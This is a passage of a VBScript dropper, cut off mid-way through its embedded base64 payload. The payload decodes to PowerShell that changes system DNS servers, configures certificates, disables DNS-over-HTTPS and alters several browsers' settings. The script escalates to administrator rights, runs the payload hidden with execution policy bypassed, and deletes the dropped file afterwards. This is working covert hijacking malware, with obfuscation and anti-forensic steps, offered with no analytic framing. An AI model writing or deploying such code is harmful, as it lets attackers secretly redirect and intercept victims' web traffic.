udCAtUGF0aCAkZmlsZVBhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCg0KICAgIGlmICgkbnVsbCAtZXEgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMgLW9yICRjb250ZW50LmRuc19vdmVyX2h0dHBzIC1pc25vdCBbb2JqZWN0XSkgew0KICAgICAgICAkY29udGVudCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICdkbnNfb3Zlcl9odHRwcycgLVZhbHVlIEB7DQogICAgICAgICAgICAnbW9kZScgPSAnb2ZmJw0KICAgICAgICAgICAgJ3RlbXBsYXRlcycgPSAiIg0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMubW9kZSA9ICdvZmYnDQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzLnRlbXBsYXRlcyA9ICIiDQogICAgfQ0KDQogICAgJGpzb25TdHJpbmcgPSAkY29udGVudCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAxMA0KDQogICAgU2V0LUNvbnRlbnQgLVBhdGggJGZpbGVQYXRoIC1WYWx1ZSAkanNvblN0cmluZyAtRW5jb2RpbmcgVVRGOCAtRm9yY2UNCg0KICAgIFdyaXRlLUhvc3QgIlN1Y2Nlc3NmdWxseSBjb25maWd1cmVkIFlhbmRleCBzZXR0aW5ncyBpbiAkZmlsZVBhdGgiDQp9DQoKCg0KCgoNCgoKDQoKCg0KCgoNCgoKDQoKCg0KCgoNCgoKDQoKCg0KCgoNCgoKDQoNCmZ1bmN0aW9uIG1haW4gew0KICAgIFNldC1ETlNTZXJ2ZXJzIC1QcmltYXJ5RE5TU2VydmVyICRwcmltYXJ5RE5TU2VydmVyIC1TZWNvbmRhcnlETlNTZXJ2ZXIgJHNlY29uZGFyeUROU1NlcnZlcg0KICAgIENvbmZpZ3VyZUNlcnRpZmljYXRlcw0KICAgIENvbmZpZ3VyZUNocm9tZQ0KICAgIENvbmZpZ3VyZUVkZ2UNCiAgICBDb25maWd1cmVZYW5kZXgNCiAgICBDb25maWd1cmVGaXJlRm94DQogICAgQ29uZmlndXJlT3BlcmENCiAgICBDb25maWd1cmVDaHJvbWVVYmxvY2sNCiAgICBDb25maWd1cmVDaHJvbWVQdXNoZXMNCiAgICBEb0F1dG9VcGRhdGUNCn0NCg0KbWFpbg0KDQo="
selfDel="yes"

If Not IsAdmin() Then
    RunElevated()
Else
    MainScriptLogic()
End If

Function DecodeBase64ToFile(base64String, outputFilePath)
    Dim xmlDoc
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.3.0")
    
    ' Create an XML element with the base64 string
    Dim node
    Set node = xmlDoc.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String
    
    ' Get the decoded binary data
    Dim binaryData
    binaryData = node.nodeTypedValue
    
    ' Create a binary stream object to save the binary data to a file
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write binaryData
    
    ' Save the binary stream to the specified output file path
    stream.SaveToFile outputFilePath, 2 ' adSaveCreateOverWrite
    stream.Close
    
    ' Clean up
    Set stream = Nothing
    Set node = Nothing
    Set xmlDoc = Nothing
End Function

Sub MainScriptLogic()
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    Dim scriptFullPath
    scriptFullPath = WScript.ScriptFullName
    Dim psScriptPath
    psScriptPath = Left(scriptFullPath, Len(scriptFullPath) - 3) & "ps1"
    DecodeBase64ToFile bodyX, psScriptPath
    Dim command
    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psScriptPath & """"
    ' Using Run method with window style 0 to run the command invisibly
    objShell.Run command, 0, True
    ' Delete the PowerShell script file and itself if selfDel is "yes"
    If selfDel = "yes" Then
        Dim fso
        Set fso = CreateObject("Scripting.FileSystemObject")
        If fso.FileExists(psScriptPath) Then
            fso.DeleteFile psScriptPath
        End If   
        ' Schedule self-deletion using cmd and timeout
        'Dim deleteCommand
        'deleteCommand = "cmd /c timeout 2 > NUL & del """ & scriptFullPath & """"
        'objShell.Run deleteCommand, 0, False
        Set fso = Nothing
    End If
    Set objShell = Nothing
End Sub

Function IsAdmin()
    Dim objWShell, result
    Set objWShell = CreateObject("WScript.Shell")
    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
    IsAdmin = (result = 0)
    Set objWShell = Nothing
End Function

Sub RunElevated()
    Dim objShell
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End Sub
